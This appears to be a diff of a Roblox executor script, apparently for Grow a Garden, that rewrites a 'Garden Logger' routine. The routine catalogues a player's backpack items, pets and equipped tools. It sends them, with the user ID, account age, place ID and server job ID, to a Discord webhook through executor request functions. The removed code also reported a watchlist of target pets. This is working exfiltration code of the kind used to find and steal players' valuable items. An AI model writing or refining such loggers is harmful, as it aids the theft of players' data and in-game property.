@@ -94,250 +94,252 @@ local requestFunc = (syn and syn.request) or (http and http.request) or request
 --   - Headers show "(X items / Y types)"
 --------------------------------------------------------------------
 local function sendBackpackToWebhook()
-    local backpack = localPlayer:FindFirstChild("Backpack")
-    if not backpack then warn("Backpack not found") return end
+	local backpack = localPlayer:FindFirstChild("Backpack")
+	if not backpack then warn("Backpack not found") return end
 
-    local fruitLookup = {}
-    for _, f in ipairs(FRUITS) do fruitLookup[f:lower()] = true end
-    local crateLookup = {}
-    for _, c in ipairs(CRATES) do crateLookup[c:lower()] = true end
+	local seedSet, crateSet = {}, {} --
+	for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
+	for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end
 
-    local function categorize(toolName)
-        local n = toolName:lower()
-        if n:find("shovel") or n:find("watering") or n:find("sprinkler")
-            or n:find("mushroom") or n:find("trowel") or n:find("hoe")
-            or n:find("rake") or n:find("fertilizer") then
-            return "gear"
-        end
-        if crateLookup[n] or n:find("crate") then return "crate" end
-        if n:find("pet") then return "pet" end
-        if n:find("seed") or fruitLookup[n] then return "seed" end
-        return "other"
-    end
+	local function isGear(name)
+		local n = name:lower()
+		return n:find("sprinkler") or n:find("watering") or n:find("can")
+			or n:find("mushroom") or n:find("trowel") or n:find("shovel")
+			or n:find("fertilizer") or n:find("hoe") or n:find("rake")
+	end
 
-    -- Buckets are name -> count maps (grouped)
-    local categorized = { seed = {}, pet = {}, gear = {}, crate = {}, other = {} }
-    local equipped = {}
+	local petSet = {}
+	for _, n in ipairs({
+		"Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
+		"Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
+		"Frog",
+		"Robin","Owl","Monkey"
+	}) do
+		petSet[n:lower()] = true
+	end
 
-    local function addTo(bucket, name)
-        bucket[name] = (bucket[name] or 0) + 1
-    end
+	local function categorise(name)
+		local low = name:lower()
+		if seedSet[low] then return "seeds" end
+		if crateSet[low] then return "crates" end
+		if petSet[low] then return "pets" end
+		if isGear(name) then return "gear" end
+		return "other" -- Everything not neatly categorized falls into "other" safely
+	end
 
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            addTo(categorized[categorize(tool.Name)], tool.Name)
-        end
-    end
+	-- Pull a stack count from a Tool (attribute, child IntValue, or fallback to 1)
+	local function getToolCount(tool)
+		for _, attr in ipairs({ "Count", "Amount", "Stack", "Quantity", "Stacks" }) do
+			local v = tool:GetAttribute(attr)
+			if type(v) == "number" and v > 0 then return v end
+		end
+		for _, childName in ipairs({ "Count", "Amount", "Stack", "Quantity" }) do
+			local c = tool:FindFirstChild(childName)
+			if c and c.Value then
+				local n = tonumber(c.Value)
+				if n and n > 0 then return n end
+			end
+		end
+		local tail = tool.Name:match("%[x(%d+)%]") or tool.Name:match("x(%d+)%s*$")
+		if tail then return tonumber(tail) end
+		return 1
+	end
 
-    local character = localPlayer.Character
-    if character then
-        for _, tool in ipairs(character:GetChildren()) do
-            if tool:IsA("Tool") then
-                addTo(equipped, tool.Name)
-            end
-        end
-    end
+	local function cleanName(name)
+		return (name:gsub("%s*%[x%d+%]%s*$", ""):gsub("%s+x%d+%s*$", ""))
+	end
 
-    local function bucketStats(bucket)
-        local items, types = 0, 0
-        for _, c in pairs(bucket) do
-            items += c
-            types += 1
-        end
-        return items, types
-    end
+	local buckets = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
+	local bucketTotals = { seeds = 0, pets = 0, gear = 0, crates = 0, other = 0 } --
+	local bucketLookups = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
+	local equippedItems, equippedLookup, equippedTotal = {}, {}, 0
 
-    local seedItems,  seedTypes  = bucketStats(categorized.seed)
-    local petItems,   petTypes   = bucketStats(categorized.pet)
-    local gearItems,  gearTypes  = bucketStats(categorized.gear)
-    local crateItems, crateTypes = bucketStats(categorized.crate)
-    local otherItems, otherTypes = bucketStats(categorized.other)
-    local eqItems,    eqTypes    = bucketStats(equipped)
+	local function addToBucket(category, name, count)
+		local lookup = bucketLookups[category]
+		local idx = lookup[name]
+		if idx then
+			buckets[category][idx].count = buckets[category][idx].count + count
+		else
+			table.insert(buckets[category], { name = name, count = count })
+			lookup[name] = #buckets[category]
+		end
+		bucketTotals[category] = bucketTotals[category] + count
+	end
 
-    local total = seedItems + petItems + gearItems + crateItems + otherItems + eqItems
+	local function addEquipped(name, count)
+		local idx = equippedLookup[name]
+		if idx then
+			equippedItems[idx].count = equippedItems[idx].count + count
+		else
+			table.insert(equippedItems, { name = name, count = count })
+			equippedLookup[name] = #equippedItems
+		end
+		equippedTotal = equippedTotal + count
+	end
 
-    -- Build "• Name ×N" list, sorted by count desc, omit ×1
-    local function buildList(bucket)
-        local keys = {}
-        for k in pairs(bucket) do table.insert(keys, k) end
-        if #keys == 0 then return "```\n— empty —\n```" end
-        table.sort(keys, function(a, b)
-            if bucket[a] == bucket[b] then return a < b end
-            return bucket[a] > bucket[b]
-        end)
-        local lines = { "```" }
-        for _, name in ipairs(keys) do
-            local c = bucket[name]
-            local entry = (c > 1) and ("• " .. name .. " ×" .. c) or ("• " .. name)
-            table.insert(lines, entry)
-            if #table.concat(lines, "\n") > 950 then
-                table.insert(lines, "…")
-                break
-            end
-        end
-        table.insert(lines, "```")
-        return table.concat(lines, "\n")
-    end
+	for _, tool in ipairs(backpack:GetChildren()) do
+		if tool:IsA("Tool") then
+			local clean = cleanName(tool.Name)
+			addToBucket(categorise(clean), clean, getToolCount(tool))
+		end
+	end
 
-    local function header(label, items, types)
-        return string.format("%s (%d items / %d types)", label, items, types)
-    end
+	local character = localPlayer.Character
+	if character then --
+		for _, tool in ipairs(character:GetChildren()) do
+			if tool:IsA("Tool") then
+				local clean = cleanName(tool.Name)
+				addEquipped(clean, getToolCount(tool))
+			end
+		end
+	end
 
-    local accountAge = tostring(localPlayer.AccountAge) .. " days"
-    local placeId = tostring(game.PlaceId)
-    local jobId = (game.JobId ~= "" and game.JobId) or "studio"
-    local serverPop = tostring(#Players:GetPlayers()) .. " players"
+	local equippedPets, ownedPets = scanPets()
+	for _, p in ipairs(equippedPets) do
+		addEquipped("🐾 " .. p, 1)
+	end
+	if #ownedPets > 0 then
+		buckets.pets = {}
+		bucketLookups.pets = {}
+		bucketTotals.pets = 0
+		for _, p in ipairs(ownedPets) do
+			table.insert(buckets.pets, { name = p, count = 1 })
+			bucketTotals.pets = bucketTotals.pets + 1
+		end
+	end
 
-    local fields = {
-        { name = "👤 User ID",     value = "```" .. tostring(localPlayer.UserId) .. "```", inline = true },
-        { name = "📆 Account Age", value = "```" .. accountAge .. "```",                  inline = true },
-        { name = "👥 In Server",   value = "```" .. serverPop .. "```",                   inline = true },
+	local totalCount = bucketTotals.seeds + bucketTotals.pets + bucketTotals.gear
+		+ bucketTotals.crates + bucketTotals.other + equippedTotal
 
-        { name = "🗺️ Place ID", value = "```" .. placeId .. "```", inline = false },
-        { name = "🧩 Job ID",   value = "```" .. jobId   .. "```", inline = false },
+	local function formatList(list)
+		if #list == 0 then return "`— empty —`" end
+		local lines = {}
+		for i, entry in ipairs(list) do
+			if type(entry) == "table" then
+				local suffix = (entry.count and entry.count > 1)
+					and (" `×" .. entry.count .. "`") or "" --
+				lines[i] = "`•` " .. entry.name .. suffix
+			else
+				lines[i] = "`•` " .. tostring(entry)
+			end
+		end
+		local text = table.concat(lines, "\n")
+		if #text > 1010 then
+			text = text:sub(1, 1000) .. "\n`… +more`"
+		end
+		return text
+	end
 
-        { name = "📦 Totals", value = string.format(
-            "🌿 Seeds: `%d` • 🐾 Pets: `%d` • 🔧 Gear: `%d`\n📦 Crates: `%d` • ⚔️ Equipped: `%d` • ❓ Other: `%d`",
-            seedItems, petItems, gearItems, crateItems, eqItems, otherItems
-        ), inline = false },
+	local HttpService = game:GetService("HttpService")
+	local function fetchAvatar(endpoint, size)
+		local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
+			.. "?userIds=" .. localPlayer.UserId
+			.. "&size=" .. size
+			.. "&format=Png&isCircular=false"
+		local ok, body = pcall(function() return game:HttpGet(url) end)
+		if not ok or not body then return nil end
+		local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
+		if not ok2 or not decoded or not decoded.data or not decoded.data[1] then return nil end
+		return decoded.data[1].imageUrl
+	end
+	local avatarThumb = fetchAvatar("avatar-headshot", "420x420")
+	local avatarAuthor = fetchAvatar("avatar-bust", "150x150") or avatarThumb
 
-        { name = "⚔️ " .. header("Equipped", eqItems, eqTypes), value = buildList(equipped), inline = false },
-    }
+	local accountAgeDays = localPlayer.AccountAge
+	local placeId = tostring(game.PlaceId) --
+	local jobId = (game.JobId ~= "" and game.JobId) or "Studio / Solo"
+	local serverPlayers = #Players:GetPlayers()
 
-    if seedItems  > 0 then table.insert(fields, { name = "🌿 " .. header("Seeds",  seedItems,  seedTypes),  value = buildList(categorized.seed),  inline = false }) end
-    if petItems   > 0 then table.insert(fields, { name = "🐾 " .. header("Pets",   petItems,   petTypes),   value = buildList(categorized.pet),   inline = false }) end
-    if gearItems  > 0 then table.insert(fields, { name = "🔧 " .. header("Gear",   gearItems,  gearTypes),  value = buildList(categorized.gear),  inline = false }) end
-    if crateItems > 0 then table.insert(fields, { name = "📦 " .. header("Crates", crateItems, crateTypes), value = buildList(categorized.crate), inline = false }) end
-    if otherItems > 0 then table.insert(fields, { name = "❓ " .. header("Other",  otherItems, otherTypes), value = buildList(categorized.other), inline = false }) end
+	local function isoTimestamp()
+		local t = os.date("!*t")
+		return string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z",
+			t.year, t.month, t.day, t.hour, t.min, t.sec)
+	end
 
-    local payload = HttpService:JSONEncode({
-        username = "Garden Logger",
-        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png",
-        embeds = {{
-            author = {
-                name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
-                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
-            },
-            title = "🌱 Inventory Snapshot",
-            description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
-            color = 0x57F287,
-            thumbnail = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=420&height=420&format=png"
-            },
-            fields = fields,
-            footer = {
-                text = "Garden Logger • " .. total .. " total items",
-                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
-            },
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    })
+	local fields = {
+		{ name = "👤 User ID", value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
+		{ name = "📆 Account Age", value = "`" .. accountAgeDays .. " days`", inline = true },
+		{ name = "👥 In Server", value = "`" .. serverPlayers .. " players`", inline = true },
+		{ name = "🗺️ Place ID", value = "`" .. placeId .. "`", inline = true },
+		{ name = "🧩 Job ID", value = "`" .. jobId .. "`", inline = false }, --
+		{ name = "📦 Totals",
+			value = string.format(
+				"🌾 Seeds: `%d`  •  🐾 Pets: `%d`  •  🛠️ Gear: `%d`\n📦 Crates: `%d`  •  ⚔️ Equipped: `%d`  •  ❔ Other: `%d`",
+				bucketTotals.seeds, bucketTotals.pets, bucketTotals.gear,
+				bucketTotals.crates, equippedTotal, bucketTotals.other
+			),
+			inline = false },
+		{ name = "⚔️ Equipped (" .. equippedTotal .. ")",
+			value = formatList(equippedItems), inline = false },
+	}
 
-    pcall(function()
-        requestFunc({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = payload
-        })
-        print("Inventory report sent to Discord for: " .. localPlayer.Name)
-    end)
-end
+	local function addCategory(emoji, label, list, total)
+		if #list > 0 then
+			local header
+			if total and total ~= #list then
+				header = string.format("%s %s (%d items / %d types)", emoji, label, total, #list)
+			else
+				header = string.format("%s %s (%d)", emoji, label, total or #list) --
+			end
+			table.insert(fields, {
+				name = header,
+				value = formatList(list),
+				inline = false
+			})
+		end
+	end
 
--- Send a rich embed to Discord (used for pet logging)
-local function sendEmbed(title, description, color, fields)
-    local payload = HttpService:JSONEncode({
-        username = "Pet Logger",
-        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png",
-        embeds = {{
-            author = {
-                name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
-                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
-            },
-            title = title,
-            description = description,
-            color = color or 0xF1C40F,
-            fields = fields or {},
-            footer = {
-                text = "Pet Logger • " .. localPlayer.Name,
-                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
-            },
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    })
-    pcall(function()
-        requestFunc({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = payload
-        })
-    end)
-end
+	addCategory("🌾", "Seeds", buckets.seeds, bucketTotals.seeds)
+	addCategory("🐾", "Pets", buckets.pets, bucketTotals.pets)
+	addCategory("🛠️", "Gear", buckets.gear, bucketTotals.gear)
+	addCategory("📦", "Crates", buckets.crates, bucketTotals.crates)
+	addCategory("❔", "Other", buckets.other, bucketTotals.other)
 
-local PET_EMOJI = {
-    bunny = "🐰",
-    robin = "🐦",
-    frog  = "🐸",
-    deer  = "🦌"
-}
+	local payload = HttpService:JSONEncode({
+		username = "Garden Logger",
+		embeds = {{
+			author = {
+				name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
+				icon_url = avatarAuthor,
+				url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
+			},
+			title = "🌱 Inventory Snapshot",
+			url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile",
+			description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
+			color = 5025616,
+			thumbnail = avatarThumb and { url = avatarThumb } or nil,
+			fields = fields,
+			footer = {
+				text = "Garden Logger • " .. totalCount .. " total items",
+				icon_url = avatarAuthor --
+			},
+			timestamp = isoTimestamp()
+		}}
+	})
 
-local alreadyLogged = {}
-local function logTargetPets(inventoryFrame)
-    local foundFields = {}
-    local totalPets = 0
-    for _, child in ipairs(inventoryFrame:GetChildren()) do
-        local name = child.Name
-        if name:sub(1, 9) == "Inv_Pets:" then
-            local petPart = name:sub(10):lower()
-            for _, target in ipairs(TARGET_PETS) do
-                if petPart:find(target, 1, true) and not alreadyLogged[name] then
-                    alreadyLogged[name] = true
-
-                    local count = "?"
-                    local innerFrame = child:FindFirstChildWhichIsA("Frame")
-                    local countLabel = child:FindFirstChild("Count", true)
-                        or child:FindFirstChild("Amount", true)
-                        or (innerFrame and innerFrame:FindFirstChildWhichIsA("TextLabel"))
-                    if countLabel and countLabel.Text then
-                        local n = countLabel.Text:match("%d+")
-                        if n then count = n end
-                    end
-
-                    local emoji = PET_EMOJI[target] or "🐾"
-                    totalPets += (tonumber(count) or 1)
-
-                    table.insert(foundFields, {
-                        name = emoji .. " " .. target:sub(1,1):upper() .. target:sub(2),
-                        value = "```yaml\nname: " .. name .. "\ncount: " .. tostring(count) .. "\n```",
-                        inline = true
-                    })
-
-                    print("[PET LOG] " .. emoji .. " Found: " .. name .. " (x" .. tostring(count) .. ")")
-                end
-            end
-        end
-    end
-
-    if #foundFields > 0 then
-        while (#foundFields % 3) ~= 0 do
-            table.insert(foundFields, { name = "\u{200B}", value = "\u{200B}", inline = true })
-        end
-
-        table.insert(foundFields, 1, {
-            name = "📊 Summary",
-            value = string.format("Detected **%d** target pet entries • total stack: **%d**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-                #foundFields, totalPets),
-            inline = false
-        })
-
-        sendEmbed(
-            "🐾 Target Pets Detected",
-            "```ansi\n\27[2;33mLogged Inv_Pets entries matching watchlist: bunny, robin, frog, deer\27[0m\n```",
-            0x2ECC71,
-            foundFields
-        )
-    end
+	local requestFunc = (syn and syn.request) or (http and http.request) or request
+	pcall(function()
+		local response = requestFunc({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = payload
+		})
+		if response and response.StatusCode then
+			if response.StatusCode >= 200 and response.StatusCode < 300 then
+				print("[GardenLogger] Inventory report sent for: " .. localPlayer.Name)
+			else
+				warn("[GardenLogger] Discord rejected the webhook — HTTP " --
+					.. tostring(response.StatusCode)
+					.. " | body: " .. tostring(response.Body or ""):sub(1, 300))
+				if response.StatusCode == 404 then
+					warn("[GardenLogger] 404 means the WEBHOOK_URL is invalid or has been deleted. Recreate the webhook in Discord and paste the new URL into WEBHOOK_URL.")
+				end
+			end
+		else
+			print("[GardenLogger] Inventory report fired for: " .. localPlayer.Name)
+		end
+	end)
 end
 
 local function clickButton(button)
